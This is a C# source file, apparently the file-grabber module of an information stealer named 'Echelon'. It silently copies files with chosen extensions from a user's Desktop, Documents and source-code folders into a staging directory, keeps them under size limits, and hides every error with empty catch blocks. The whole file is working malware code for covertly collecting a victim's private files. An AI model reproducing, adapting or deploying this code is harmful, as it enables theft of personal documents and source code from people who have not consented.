


using System;
using System.Collections.Generic;
using System.IO;

namespace Echelon
{
    public class Files
    {
        public static int count;

        public static void GetFiles(string Echelon_Dir)
        {
            if (Program.enableGrab)
            {
                try
                {
                    var Files = Echelon_Dir + "\\Files";
                    Directory.CreateDirectory(Files);
                    if (!Directory.Exists(Files))
                    {
                        GetFiles(Files);
                    }
                    else
                    {
                        // 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
                        CopyDirectory(Help.DesktopPath, Files, "*.*", Program.sizefile);
                        CopyDirectory(Help.MyDocuments, Files, "*.*", Program.sizefile);
                        CopyDirectory(Help.UserProfile + "\\source", Files, "*.*", Program.sizefile);

                        // CopyDirectory("[From]"], "[To]", "*.*", "[Limit]");   
                    }
                }
                catch { }
            }
        }

        private static long GetDirSize(string path, long size = 0)
        {
            try
            {
                foreach (var file in Directory.EnumerateFiles(path))
                    try
                    {
                        size += new FileInfo(file).Length;
                        
                    }
                    catch  { }

                foreach (var dir in Directory.EnumerateDirectories(path))
                    try
                    {
                        size += GetDirSize(dir);
                    }
                    catch  { }
            }
            catch  { }
            return size;
        }

        public static void CopyDirectory(string source, string target, string pattern, long maxSize)
        {
            var stack = new Stack<GetFiles.Folders>();
            stack.Push(new GetFiles.Folders(source, target));
            var size = GetDirSize(target);
            while (stack.Count > 0)

            {
                var folders = stack.Pop();
                try
                {
                    Directory.CreateDirectory(folders.Target);
                    foreach (var file in Directory.EnumerateFiles(folders.Source, pattern))
                        try
                        {
                            if (Array.IndexOf(Program.expansion, Path.GetExtension(file).ToLower()) < 0) continue;
                            var targetPath = Path.Combine(folders.Target, Path.GetFileName(file));
                            if (new FileInfo(file).Length / 0x400 < 0x1388) // 1024 < 5000
                            {
                                File.Copy(file, targetPath);
                                size += new FileInfo(targetPath).Length;
                                if (size > maxSize) return;
                                count++;
                            }
                        }
                        catch  { }
                }
                catch  (UnauthorizedAccessException) { continue; }
                catch  (PathTooLongException) { continue; }
                try
                {
                    foreach (var folder in Directory.EnumerateDirectories(folders.Source))
                        try
                        {
                            if (!folder.Contains(Path.Combine(Help.DesktopPath, Environment.UserName))) stack.Push(new GetFiles.Folders(folder, Path.Combine(folders.Target, Path.GetFileName(folder))));
                        }
                        catch  { }
                }
                catch  (UnauthorizedAccessException) {
                }
                catch  (DirectoryNotFoundException) {
                }
                catch  (PathTooLongException) {
                }
            }
            stack.Clear();
        }
    }
}
